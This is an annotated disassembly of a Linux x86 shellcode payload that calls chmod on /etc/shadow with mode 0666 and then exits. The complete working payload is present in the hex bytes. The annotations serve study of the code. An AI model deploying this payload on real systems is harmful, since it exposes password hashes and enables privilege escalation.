00000000  99                cdq			; set edx to whatever value the sign bit of eax has
00000001  6A0F              push byte +0xf	; push the value of 15 to the stack
00000003  58                pop eax		; pop the value from the stack
00000004  52                push edx		; write null to the stack
00000005  E80C000000        call 0x16		; make a call and push the next instruction address to the stack
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popa
00000012  646F              fs outsd
00000014  7700              ja 0x16
00000016  5B                pop ebx		; the ret address is stored in ebx
00000017  68B6010000        push dword 0x1b6	; a value is pushed to the stack
0000001C  59                pop ecx		; and the ecx gets it
0000001D  CD80              int 0x80

0000001F  6A01              push byte +0x1	; exit sys call
00000021  58                pop eax
00000022  CD80              int 0x80
